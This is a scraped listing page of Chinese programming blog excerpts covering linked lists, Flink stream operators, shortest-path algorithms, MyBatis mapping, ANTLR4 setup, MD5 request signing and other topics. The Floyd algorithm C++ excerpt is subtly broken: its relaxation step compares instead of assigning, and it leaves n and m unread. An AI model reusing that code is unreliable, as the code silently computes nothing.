3.3.1、删除操作 实际软件开发中，从链表中删除一个数据无外乎两种情况
❝ 删除值等于某个给定值的结点删除给定指针指向的结点 ❞ 「第一种情况」，不管是单链表还是双向链表，为了查找到等于给定值的结点，都需要从头结点开始依次遍历对比，直到找到值等于给定值的结点，然后通过前面说的指针操作将其删除。
尽管单纯的删除操作时间复杂度是O(1)，但遍历查找时间复杂度是主要的耗时点，对应的时间复杂度为O(n)。根据时间复杂度分析法中的加法法则，第一种情况操作的时间复杂度是O(n)。
「第二种情况」，我们已经找到了要删除的结点q。但删除结点q时，需要知道其前驱结点，而单链表并不支持直接获取前驱结点，所以为了找到前驱结点，我们还是需要从头结点开始遍历链表，直到p.next = q，说明p是q的前驱结点。
因为双向链表中的结点已经保存了前驱结点的指针，就不需要像单链表那样遍历。所以，针对第二种情况，单链表删除操作需要O(n)的时间复杂度，而双向链表只需要在O(1)的时间复杂度内就可以搞定了。
3.3.2、插入操作 实际软件开发中，在链表中插入一个结点一般有下面两种情况
❝ 在某个指定结点后插入一个结点在某个指定结点前插入一个结点 ❞ 插入操作的分析同删除操作类似，我们可以得出
「第一种情况」，单链表和双向链表的操作时间复杂度都是O(1)
「第一种情况」，单链表的操作时间复杂度都是O(n)，和双向链表的操作时间复杂度都是O(1)
实际上，这里应用的是「用空间换时间」的设计思想。
3.3.3、双向循环链表 双向循环链表的结构如下
4、链表和数组的性能对比 时间复杂度分析，如下：
数组链表插入O(n)O(1)删除O(n)O(1)随机访问O(1)O(n) 数组简单易用，在实现上使用的是连续的内存空间，可以借助CPU的缓存机制，预读数组中的数据，所以访问效率更高。而链表在内存中并不是连续存储，所以对CPU缓存不友好，没办法有效预读。
数组的缺点是大小固定，已经声明就要占用整块连续内存空间。如果声明的数组过大，系统可能没有足够的连续内存空间分配给它，导致「内存不足out of memory」。如果声明的数组过小，则可能出现不够用的情况。这时只能再申请一个更大的内存空间，把原数组拷贝进去，这个过程非常耗时。链表本身没有大小限制，天然地支持动态扩容，这也是它与数组最大的区别。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f538aa6f4db23b2a771417f4487055d/" rel="bookmark">
			proxy connect abort处理方法_Flink算子使用方法及实例演示：union和connect
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Flink的Transformation转换主要包括四种：单数据流基本转换、基于Key的分组转换、多数据流转换和数据重分布转换。读者可以使用Flink Scala Shell或者Intellij Idea来进行练习：
Flink Scala Shell使用教程Intellij Idea开发环境搭建教程Flink单数据流基本转换：map、filter、flatMapFlink基于Key的分组转换：keyBy、reduce和aggregations 很多情况下，我们需要对多个数据流进行整合处理，Flink为我们提供了多流转换算子，本文主要介绍多流转换。
union 在DataStream上使用union算子可以合并多个同类型的数据流，并生成同类型的数据流，即可以将多个DataStream[T]合并为一个新的DataStream[T]。数据将按照先进先出（First In First Out）的模式合并，且不去重。下图union对白色和深色两个数据流进行合并，生成一个数据流。
假设股票价格数据流来自不同的交易所，我们将其合并成一个数据流：
val shenzhenStockStream: DataStream[StockPrice] = ... val hongkongStockStream: DataStream[StockPrice] = ... val shanghaiStockStream: DataStream[StockPrice] = ... val unionStockStream: DataStream[StockPrice] = shenzhenStockStream.union(hongkongStockStream, shanghaiStockStream) connect union虽然可以合并多个数据流，但有一个限制，即多个数据流的数据类型必须相同。connect提供了和union类似的功能，用来连接两个数据流，它与union的区别在于：
connect只能连接两个数据流，union可以连接多个数据流。connect所连接的两个数据流的数据类型可以不一致，union所连接的两个数据流的数据类型必须一致。两个DataStream经过connect之后被转化为ConnectedStreams，ConnectedStreams会对两个流的数据应用不同的处理方法，且双流之间可以共享状态。 connect经常被应用在对一个数据流使用另外一个流进行控制处理的场景上，如下图所示。控制流可以是阈值、规则、机器学习模型或其他参数。
对于ConnectedStreams，我们需要重写CoMapFunction或CoFlatMapFunction。这两个接口都提供了三个泛型，这三个泛型分别对应第一个输入流的数据类型、第二个输入流的数据类型和输出流的数据类型。在重写函数时，对于CoMapFunction，map1处理第一个流的数据，map2处理第二个流的数据；对于CoFlatMapFunction，flatMap1处理第一个流的数据，flatMap2处理第二个流的数据。Flink并不能保证两个函数调用顺序，两个函数的调用依赖于两个数据流数据的流入先后顺序，即第一个数据流有数据到达时，map1或flatMap1会被调用，第二个数据流有数据到达时，map2或flatMap2会被调用。下面的代码对一个整数流和一个字符串流进行了connect操作。
val intStream: DataStream[Int] = senv.fromElements(1, 0, 9, 2, 3, 6) val stringStream: DataStream[String] = senv.fromElements("LOW", "HIGH", "LOW", "LOW") val connectedStream: ConnectedStreams[Int, String] = intStream.connect(stringStream) // CoMapFunction三个泛型分别对应第一个流的输入、第二个流的输入，map之后的输出 class MyCoMapFunction extends CoMapFunction[Int, String, String] { override def map1(input1: Int): String = input1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f538aa6f4db23b2a771417f4487055d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2f5051f90aac8d34398d8e693bc94523/" rel="bookmark">
			最短路算法的总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		因为各种原因鸽了一个月的博客。今天就把三种最短路都简单归纳一下记录一下。
首先介绍最短路的背景
最短路问题是图论理论的一个经典问题。寻找最短路径就是在指定网络中两结点间找一条距离最小的路。最短路不仅仅指一般地理意义上的距离最短,还可以引申到其它的度量,如时间、费用、线路容量等。
最短路径算法的选择与实现是通道路线设计的基础,最短路径算法是计算机科学与地理信息科学等领域的研究热点,很多网络相关问题均可纳入最短路径问题的范畴之中。经典的图论与不断发展完善的计算机数据结构及算法的有效结合使得新的最短路径算法不断涌现。对最短路问题的研究早在上个世纪60年代以前就卓有成效了,其中对赋权图的有效算法是由荷兰著名计算机专家E.W.Dijkstra在1959年首次提出的,该算法能够解决两指定点间的最短路,也可以求解图G中一特定点到其它各顶点的最短路。后来海斯在Dijkstra算法的基础之上提出了海斯算法。但这两种算法都不能解决含有负权的图的最短路问题。因此由Ford提出了Ford算法,它能有效地解决含有负权的最短路问题。
1.Floyd算法
floyd可以在O(n3)的时间复杂度,O(n2)的空间复杂度下求解正权图中任意两点间的最短路长度.它的本质是动态规划.
定义f[k][i][j]表示从i出发,途中只允许经过编号小于等于k的点时的最短路.(i,j可以大于k但i到j的路径上的其他点必须编号小于等于k).
转移时从第k层的DP数组f[k][][]求解第k+1层的DP数组f[k+1][i][j].我们可以将f[k+1][][]全部初始化为inf
一条路径如果保证中转的点编号小于等于k,那么一定也满足经过的点的编号小于等于k+1.于是可以先将上一层的dp数组直接复制到第k+1层,f[k+1][i][j]=f[k][i][j].
接下来考虑经过了第k+1个点作为中转点的最短路.我们枚举(i,j),i!=k+1,j!=k+1,然后令f[k+1][i][j]=min(f[k+1][i][j],f[k][i][k+1]+f[k][k+1][j]).
直接这么写的空间复杂度是O(n3),接下来我们把空间压到O(n2).i,j这两维都是压不掉的,所以我们把k这一维压掉.f[i][j]现在存的是f[k][i][j].接下来我们把f[i][j]进行更新使得它里面的数值变为f[k+1][i][j]
代码实现也很简单
#include&lt;bits/stdc++.h&gt; using namespace std; const int inf = 0x3f3f3f3f; const int maxn = 100; int map1[maxn][maxn]; int u,v,w; int main(){ int n,m,i,j,k; memset(map1,inf,sizeof(map1)); for(i = 1;i&lt;=n;i++){ map1[i][i] = 0; } while(m--){ scanf("%d %d %d",&amp;u,&amp;v,&amp;w); map1[u][v] = map1[v][u] = w; } for(k = 1;k&lt;=n;k++){ for(i = 1;i&lt;=n;i++){ for(j = 1;j&lt;=n;j++){ if(map1[i][j]&gt;map1[i][k]+map1[k][j]){ map1[i][j]&gt;map1[i][k]+map1[k][j]; } } } } printf("%d\n",map1[1][n]); } 这里选择了使用邻接矩阵存图，原因是Floyd算法复杂度较高，一般用于解决规模较小的问题，所以不需要更高效率的存储工具，邻接矩阵可以很好的完成这个任务。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2f5051f90aac8d34398d8e693bc94523/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a840473900739c641c6c2f50891fb349/" rel="bookmark">
			Laya使用同一个图片资源导入为texture2D并同时使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一般导入资源的方法(资源地址是url)：
1、
async preload(url){
await Laya.loader.load(url);
let tex = Laya.loader.getRes(url);
// use code
}
2、
Laya.loader.load(url, Laya.Handler.create(this, (tex)=&gt;{
// use code
}))
如果需要导入一个资源重复使用，比如在一个for循环中给新建的材质赋予tex，比如：
for(let i = 0; i &lt; 10; i++){
let mat = new Laya.UnlitMaterial();
// the way 1 or 2 before to get the tex
mat.albedoTexture = tex;
// use mat
}
你会得到一个报错，因为Laya.loader.load默认缓存创建的tex，你多次get出来的是同一个txture对象
正确使用tex的方法：
Laya.loader.load(temp.texture.path, Laya.Handler.create(this, (tex)=&gt;{
mat.albedoTexture = tex;
}), null, Laya.Loader.TEXTURE2D, 0, false, "", true);
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a840473900739c641c6c2f50891fb349/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5eac23542beb2476218e7f549e60e297/" rel="bookmark">
			C语言学习 单精度、双精度各有几位小数？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		单精度有6位小数，双精度有15位小数。
单精度数（float型）在32位计算机中存储占用4字节，也就是32位，有效位数为7位，小数点后6位。
双精度数（double型）在32位计算机中存储占用8字节，也就是64位，有效位数为16位，小数点后15位。
扩展资料：
单精度浮点数格式是一种计算机数据格式，在计算机存储器中占用4个位元（32 bits），利用“浮点”（浮动小数点）的方法，可以表示一个范围很大的数值。
C、C++中使用到的双精度浮点数（double）类型是在IEEE二进制浮点数算术标准（ANSI/IEEE Std 754-1985）中定义的。双精度浮点数（Double）用来表示带有小数部分的实数，一般用于计算机变成中定义变量，占用8个字节存储空间。
参考资料来源：百度百科-单精度浮点数
参考资料来源：百度百科-精度浮点数
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/53f940626d8fb3415bce6dd43e03b20c/" rel="bookmark">
			java 服务器下载APK文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一种: 通过request,response 方式
public void appDown(){ String path = APKPropertiesUtil.getPropertyValue("apk.path"); // apk 路径 String apkName = APKPropertiesUtil.getPropertyValue("apk.name"); // apk名称 String apkPath = path+"\\"+apkName; //new 一个apk的文件对象 File file = new File(apkPath); try { if(file.exists()){ // 以流的形式下载文件。 InputStream fis = new BufferedInputStream(new FileInputStream(apkPath)); byte[] buffer = new byte[fis.available()]; fis.read(buffer); fis.close(); // 清空response response.reset(); // 设置response的Header response.addHeader("Content-Disposition", "attachment;filename=" + file.getName()); response.addHeader("Content-Length", "" + file.length()); response.addHeader("Content-Type", "application/vnd.android.package-archive apk"); OutputStream toClient = new BufferedOutputStream(response.getOutputStream()); response.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/53f940626d8fb3415bce6dd43e03b20c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/be32f42e8b43a9f5363b92bbaeb6202d/" rel="bookmark">
			实体类中的属性名和表中的字段名不一样 怎么办？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 实体类中的属性名和表中的字段名不一样 怎么办？ 第1种： 通过在查询的sql语句中定义字段名的别名，让字段名的别名和实体类的属性名一致。下面展示一些 内联代码片。
&lt;select id=”selectorder” parametertype=”int” resultetype=”me.gacl.domain.order”&gt; select order_id id, order_no orderno ,order_price price form orders where order_id=#{id}; &lt;/select&gt; 第2种： 通过来映射字段名和实体类属性名的一一对应的关系
&lt;select id="getOrder" parameterType="int" resultMap="orderresultmap"&gt; select * from orders where order_id=#{id} &lt;/select&gt; &lt;resultMap type=”me.gacl.domain.order” id=”orderresultmap”&gt; &lt;!–用id属性来映射主键字段–&gt; &lt;id property=”id” column=”order_id”&gt; &lt;!–用result属性来映射非主键字段，property为实体类属性名，column为数据表中的属性–&gt; &lt;result property = “orderno” column =”order_no”/&gt; &lt;result property=”price” column=”order_price” /&gt; &lt;/reslutMap&gt; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8099979dda2328524540e3b616afdf49/" rel="bookmark">
			【邻接表】邻接表的静态实现（链式前向星）及vector实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一.链表（数组模拟）1.引入2.模板 二.链式前向星1.引入2.模板初始化加边dfs遍历bfs遍历 三.vector 实现邻接表 一.链表（数组模拟） 1.引入 链表相比于数组：
优势：
插入删除操作非常快，并且因为动态分配内存的缘故，即便事先不知道数据范围的大小也没关系，对内存的使用效率较高；
劣势：
查询速度慢，且可能内存泄漏。而且，在ACM比赛中用链表写的程序不容易调试
所以，可以使用数组来模拟链表，因为ACM的题目都会事先给出数据的范围。
2.模板 用数组模拟链表，就是给每一个结点编一个号，用这个号码来代替指针指向结点
结点的建立：
const int maxn=10000000; typedef struct{ int data; int pre,next; }Linklist; Linklist node[maxn]; 初始化：
设立头尾结点，以减少程序编写时对链表边界的判断
int tot,head,rear; void init(){ head=1,rear=2; tot=2; node[head].next=rear; node[rear].pre=head; } 插入：
基本思想和链表一样
void L_insert(int p,int value){ int q=tot++; node[node[p].next].pre=q; node[q].next=node[p].next; node[q].data=value; node[q].pre=p; node[p].next=q; } 删除：
可以发现删除结点后，被删除结点的编号并没有类似“释放内存”的操作，这块空间永远还是存在，只是从链表中被“删除”了
void L_remove(int p){ node[node[p].pre].next=node[p].next; node[node[p].next].pre=node[p].pre; } 二.链式前向星 1.引入 邻接表是图的一种存储方式。它的思想是用N条链表储存一个有N个顶点的有向图，其中第i条链表储存以第i个顶点为始点的所有边，注意邻接表储存的是边的信息所以适用于点稀疏图。
若要储存无向图，则将一条边看成两条有向边储存即可。
但是用链表来写很麻烦，所以我们同样可以用数组来进行模拟，实现静态的邻接表，也就是所谓的链式前向星
邻接矩阵是用一个N*N的矩阵来存放任意两点间的权值（没有通路则为inf），空间复杂度为 O ( N 2 ) O(N^2) O(N2)；邻接表的空间复杂度为 O ( M + N ) O(M+N) O(M+N)，其中M为边的条数，N为点的个数。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8099979dda2328524540e3b616afdf49/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9baae198e8d971d18a422d55ceb88cbc/" rel="bookmark">
			ANTLR4 解析语法树 以及IDEA相关插件使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ANTLR4 解析语法树 以及IDEA相关插件使用 前言 首先，写这篇博文主要是为了记录下我在用antlr+idea开发时遇到的坑点来帮助大家，希望大家不要走我的弯路，同时也是记录自己的一个写编译器历程。
ANTLR简介 在这就给大家用我自己的话简单介绍一下antlr，就功能需求而言，其就是一个在你给定文法的前提下，能将输入串转换成语法树的工具。
也就是，你给定一个文法，再给定一个输入串，他能判断该输入串是否符合该文法，如果符合，就能将其生成为一棵语法树供你进一步使用。
IDEA插件 在idea的plugins中进行搜索ANTLR4应该就能搜到该插件，进行下载重启即可，如下图所示。
重启后就能在下方工具栏看到ANTLR Preview和Tool Output两栏，也就是插件提供的功能。如何使用该插件在下文会提到。
如何使用ANTLR 如何来使用该工具呢，首先当然是配置环境，因为本人是使用Java语言来进行开发的，所以只能配置一下maven的依赖即可，请一定注意，版本号应和上文下载的插件对应的最新版本号吻合，否则可能会有bug
&lt;dependency&gt; &lt;groupId&gt;org.antlr&lt;/groupId&gt; &lt;artifactId&gt;antlr4-runtime&lt;/artifactId&gt; &lt;version&gt;4.8&lt;/version&gt; &lt;/dependency&gt; 然后配置好环境后，下一步就是开始写文法。ANTLR专门的.g4后缀文件，用于写文法，在IDEA中随便找个目录新建一个xxx.g4文件即可，这里推荐大家将xxx的第一个字母大写，因为后面会根据该文件名生成对应的类，所以首字母大写会好一些。
在创建好.g4文件后，它的图标应该长这样，如下图
当然也有可能它不长那样(比如我自己的)，可能就是IDEA本身的问题了，像这样
如果遇到图标无法正常显示，那么插件的功能也就无法正常使用了，因为它没法在该文件中进行相关文法的检验。所以怎么解决呢？
我本人是通过在项目src/main/java目录里新建一个Scratch File，如下图：
[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-UoKOeggi-1607319549983)(https://i.loli.net/2020/12/07/WQtogHCeP9EnZNA.png)]
]
然后里面就应该有这样的画面，然后点击第一个创建，应该就能拿到正常图标显示的文件了，也可以进行相关插件的使用了。
然后在该文件中进行相关文法的书写，文法的书写规范这里就不再赘述了，大家可以自行找相关博客来学习，在我们成功完成文法的书写后，我们就可以开始生成相应的parser和lexer了。
但是需要注意的是，ANTLR是不支持直接左递归文法的，需要进行改写。
我们在g4文件处右键首先进行配置，选择Configure ANTLR
]
就应该会有这个页面
]
然我们在第一个框里选择想要导出的位置，一般是选择在项目中新建一个包，并选择该包，然后选择OK就行。
然后我们就可以点击上图的Generate ANTLR Recognizer进行类的生成了。生成成功应该如下图所示：
]
其中Parser是语法分析的类，Lexer是词法分析的类，此时我们就已经可以开始通过输入一些字符串来检查是否符合我们的文法了。
我们就在一个Main方法中输入以下语句即可
public static void main(String[] args) throws IOException, RecognitionException { File file = new File("xxx"); // 自行选择路径 InputStream in = new FileInputStream(file); ANTLRInputStream input = new ANTLRInputStream(in); C0Lexer lex = new C0Lexer(input); CommonTokenStream tokens = new CommonTokenStream(lex); C0Parser parser = new C0Parser(tokens); C0Parser.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9baae198e8d971d18a422d55ceb88cbc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae064656f055d29854ad57856d5607b0/" rel="bookmark">
			接口签名
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转自https://www.cnblogs.com/Aluosen/p/11391725.html
一、不进行验证的方式
api查询接口：
app调用：http://api.test.com/getproducts?参数1=value1…
如上，这种方式简单粗暴，通过调用getproducts方法即可获取产品列表信息了，但是 这样的方式会存在很严重的安全性问题，没有进行任何的验证，大家都可以通过这个方法获取到产品列表，导致产品信息泄露。
那么，如何验证调用者身份呢？如何防止参数被篡改呢？
二、MD5参数签名的方式
我们对api查询产品接口进行优化：
1.给app分配对应的key、secret2.Sign签名，调用API 时需要对请求参数进行签名验证，签名方式如下： a. 按照请求参数名称将所有请求参数按照字母先后顺序排序得到：keyvaluekeyvalue…keyvalue
字符串如：将arong=1,mrong=2,crong=3 排序为：arong=1, crong=3,mrong=2
然后将参数名和参数值进行拼接得到参数字符串：arong1crong3mrong2。
b. 将secret加在参数字符串的头部后进行MD5加密 ,加密后的字符串需大写。即得到签名Sign
新api接口代码:
app调用：http://api.test.com/getproducts?key=app_key&amp;sign=BCC7C71CF93F9CDBDB88671B701D8A35&amp;参数1=value1&amp;参数2=value2…
注：secret 仅作加密使用, 为了保证数据安全请不要在请求参数中使用。 如上，优化后的请求多了key和sign参数，这样请求的时候就需要合法的key和正确签名sign才可以获取产品数据。这样就解决了身份验证和防止参数篡改问题，如果请求参数被人拿走，没事，他们永远也拿不到secret,因为secret是不传递的。再也无法伪造合法的请求。
但是…这样就够了吗？细心的同学可能会发现，如果我获取了你完整的链接，一直使用你的key和sign和一样的参数不就可以正常获取数据了…-_-!是的，仅仅是如上的优化是不够的
请求的唯一性：
为了防止别人重复使用请求参数问题，我们需要保证请求的唯一性，就是对应请求只能使用一次，这样就算别人拿走了请求的完整链接也是无效的。
唯一性的实现：在请求参数中，我们加入时间戳
：timestamp（yyyyMMddHHmmss），同样，时间戳作为请求参数之一，也加入sign算法中进行加密。
新的api接口：
app调用：
http://api.test.com/getproducts?key=app_key&amp;sign=BCC7C71CF93F9CDBDB88671B701D8A35&amp;timestamp=201603261407&amp;参数1=value1&amp;参数2=value2…
如上，我们通过timestamp时间戳用来验证请求是否过期。这样就算被人拿走完整的请求链接也是无效的。
Sign签名安全性分析：
通过上面的案例，我们可以看出，安全的关键在于参与签名的secret，整个过程中secret是不参与通信的，所以只要保证secret不泄露，请求就不会被伪造。
签名设计
对于敏感的api接口，需使用https协议 https是在http超文本传输协议加入SSL层，它在网络间通信是加密的，所以需要加密证书。
https协议需要ca证书，一般需要交费。
签名的设计
原理：用户登录后向服务器提供用户认证信息（如账户和密码），服务器认证完后给客户端返回一个Token令牌，用户再次获取信息时，带上此令牌，如果令牌正取，则返回数据。对于获取Token信息后，访问用户相关接口，客户端请求的url需要带上如下参数：
时间戳：timestamp
Token令牌：token
然后将所有用户请求的参数按照字母排序（包括timestamp，token），然后更具MD5加密（可以加点盐），全部大写，生成sign签名，这就是所说的url签名算法。然后登陆后每次调用用户信息时，带上sign，timestamp，token参数。
例如：原请求https://www.andy.cn/api/user/update/info.shtml?city=北京 （post和get都一样，对所有参数排序加密）
加上时间戳和token
https://www.andy.cn/api/user/update/info.shtml?city=北京&amp;timestamp=12445323134&amp;token=wefkfjdskfjewfjkjfdfnc
然后更具url参数生成sign
最终的请求如
https://www.andy.cn/api/user/update/info.shtml?city=北京&amp;timestamp=12445323134&amp;token=wefkfjdskfjewfjkjfdfnc&amp;sign=FDK2434JKJFD334FDF2
其最终的原理是减小明文的暴露次数；保证数据安全的访问。
具体实现如下：
1.api请求客户端想服务器端一次发送用用户认证信息（用户名和密码），服务器端请求到改请求后，验证用户信息是否正确。
如果正确：则返回一个唯一不重复的字符串（一般为UUID），然后在Redis（任意缓存服务器）中维护Token----Uid的用户信息关系，以便其他api对token的校验。
如果错误：则返回错误码。
2.服务器设计一个url请求拦截规则
（1）判断是否包含timestamp，token，sign参数，如果不含有返回错误码。
（2）判断服务器接到请求的时间和参数中的时间戳是否相差很长一段时间（时间自定义如半个小时），如果超过则说明该url已经过期（如果url被盗，他改变了时间戳，但是会导致sign签名不相等）。
（3）判断token是否有效，根据请求过来的token，查询redis缓存中的uid，如果获取不到这说明该token已过期。
（4）根据用户请求的url参数，服务器端按照同样的规则生成sign签名，对比签名看是否相等，相等则放行。（自然url签名也无法100%保证其安全，也可以通过公钥AES对数据和url加密，但这样如果无法确保公钥丢失，所以签名只是很大程度上保证安全）。
（5）此url拦截只需对获取身份认证的url放行（如登陆url），剩余所有的url都需拦截。
3.Token和Uid关系维护
对于用户登录我们需要创建token–uid的关系，用户退出时需要需删除token–uid的关系
总结
上述的Sign签名的方式能够在一定程度上防止信息被篡改和伪造，保障通信的安全，这里使用的是MD5进行加密，当然实际使用中大家可以根据实际需求进行自定义签名算法，比如：RSA，SHA等
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c6adb3d6dc2e51e114e8c4d76e2cefa/" rel="bookmark">
			Games101 课堂笔记 光栅化（三角形）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文内容： 1）光栅化概念导入：2）像素：3）屏幕空间：4）Rasterization: Drawing to Raster Displays5）A Simple Approach: Sampling（采样）（ 一 ）光栅化作为2D采样（二）判断点在内部还是外部：（三）引出锯齿： 上节课我们讲了MVP变换，MVP变换过程可以理解为照相过程：
1）Model transformation(placing objects) = 找好一个场景，让人物摆好姿势 2）View transformation(placing camera) = 放置好照相机 3）Projection transformation = 按下快门，将三维物体表现在二维平面上 那么在这三步做完了之后，所有的物体都会被转化到经典的-1 到 1 的立方这个立方体里面去，最后要把这个画在哪里呢？
答案当然是屏幕上。
1）光栅化概念导入： 对于图形学来说，我们抽象的将屏幕定义为**一个二维的数组，数组中的每一个元素是一个像素（an array of pixelx）。
(tips:例如19201080分辨率，就是说长为1920个像素点，宽为1080个像素点。)
屏幕是一个典型的光栅成像设备。Raster的由来是德语中屏幕的意思，而光栅化（Rasterize）就是把东西画在屏幕上的意思。所以把东西画在屏幕上的过程就是光栅化的过程。
像素名字的由来是picture element，我们将其缩写为pixel。
2）像素： 在图形学中我们将像素看为：
1）是一个一个的小的方块. 2）每个方块内的颜色是完全一致的，像素就是最小的单位了，像素内部不会再发生变化。 3）我们用256个等级0-255来表示灰度（如等级0表示是黑的，等级255表示是白的）,一个像素内的颜色可以用 rgb（red,green,blue）三个值来定义，用红绿蓝的各种组合来表示每一种红色蓝色绿色的密度，例如红色是(255,0,0),白色是（255,255,255）。 4）一个像素内颜色不会发生任何差异。 3）屏幕空间： 屏幕空间就是以屏幕左下角为原点建立一个二维坐标系，如下图：
1）用(x,y)表示像素的位置。（蓝色像素表示为（2,1）坐标来表示） 2）如果一个屏幕分辨率为width * height，那么我们定义像素下标从（0，0）到（width - 1，height - 1）， 且(x,y)像素的中心在（x + 0.5, y + 0.5），如蓝色像素的中心为（2.5,1.5）。 ***3）屏幕范围从（0，0）到（width，height）*** 现在我们要将一个中心在坐标原点，棱长为2的立方体显示在长为height、宽为width的屏幕中，如下图所示：
***1）此时我们暂时忽略Z轴方向。*** ***2）将右边的[-1,1] * [-1,1]转化到左边XOY平面上的[0,width] * [0,height].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0c6adb3d6dc2e51e114e8c4d76e2cefa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/24d2aed2d80a3b7cbe57d0a5c60f7e23/" rel="bookmark">
			python表白代码_教你两种用Python简单作图而后优雅表白的方法(附代码)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一种：Gif图，简单优雅，代码易懂，用python标准库turtle一步步画图，完成之后用屏幕录制gif工具生成动图就行了，效果演示：
代码如下：
import turtleimport time# writing txtturtle.hideturtle()
turtle.penup()
turtle.goto(80, 50)# turtle.pendown()turtle.color("purple") time.sleep(1)
#XX同学可以改为你自己的表白对象
turtle.write("XX同学给你画个东西", font=("Times", 18, "bold"))
time.sleep(0.5)
turtle.goto(180, 10)
turtle.write("开始了哈~", font=("Times", 18, "bold"))
time.sleep(0.5)
turtle.goto(200, -20)
turtle.write("Ready?", font=("Times", 18, "bold"))
time.sleep(0.5)
turtle.goto(215, -50)
turtle.write("go!", font=("Times", 18, "bold"))
time.sleep(0.5)# turtle.end_fill()## 设置初始位置turtle.goto(0, 0)
turtle.color("black")
turtle.penup()
turtle.left(90)
turtle.fd(200)
turtle.pendown()
turtle.right(90)# 花蕊turtle.fillcolor("red")
turtle.begin_fill()
turtle.circle(10, 180)
turtle.circle(25, 110)
turtle.left(50)
turtle.circle(60, 45)
turtle.circle(20, 170)
turtle.right(24)
turtle.fd(30)
turtle.left(10)
turtle.circle(30, 110)
turtle.fd(20)
turtle.left(40)
turtle.circle(90, 70)
turtle.circle(30, 150)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/24d2aed2d80a3b7cbe57d0a5c60f7e23/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/74f8cd6f1b93dbc79cfa2f2996cf9f3b/" rel="bookmark">
			005. kogito建模-事件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 引子 其实一直在考虑我要不要再重复写流程引擎建模的部分，毕竟网上，书上，视频上，都已经有很多教程了。不过，想了一想，我是工作流引擎小白啊，我写博客这些的目的是自己的学习记录，为啥不能写。
大部分的bpmn建模讲解，其实都依靠着一个特定的工作流引擎来运行，比如JBPM, activiti, flowable，虽然都是支持BPMN2.0，但就kogito来说，并不全完支持的BPMN2.0建模标记，所以，今天这篇博文内容，多源于官方文档。
2. 事件模型 2.1. 起点事件（Starts） 起点，又称为起点事件(Start Event)，就是一个触发的机制。
起点类型主流程子流程说明普通起点不支持一个主流程或子流程最多有且仅有一个普通起点消息起点一个流程可以有多个消息起点计时器起点一个流程可以有多个计时器起点信号起点一个流程可以有多个信号起点 普通起点：官方命名为NoneStart，是一个流程的默认起点，前面几个接触的列子都是这个类型，表现为以Process ID为请求的URL，通过POST传入参数，该流程即触发。正因为是一个流程的默认触发点，所以一个流程或子流程，只能拥有一个该类型的起点。消息起点：官司方命名为MessageStart，通过消息触发该起点，接收到特定的消息（事件发生），即触发该流程起点，流程初始化，开始执行。由于一个消息可能被多个消息起点监听，因此，一个消息事件是可能触发多个起点，并且起动多个流程的。计时器起点：TimerStart，在启动这个流程的时候，会先启动一个计时器，计时器结束时，流程才正式开始执行。信号起点：SignalStart，以一个信号代码触发该标记，监听到该信号时，流程开始执行。 2.2. 中间事件（IntermediateEvent） BPMN intermediate events drive the flow of a business process.You can add these events between start and end events or as a catch event on the boundary of an activity, such as a subprocess or a user task. You can configure boundary catch events as interrupting or non-interrupting events. An interrupting boundary catch event cancels the bound activity whereas a non-interrupting event does not.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/74f8cd6f1b93dbc79cfa2f2996cf9f3b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e7fb0bba0bfc1dcdacb8735a1f4f172/" rel="bookmark">
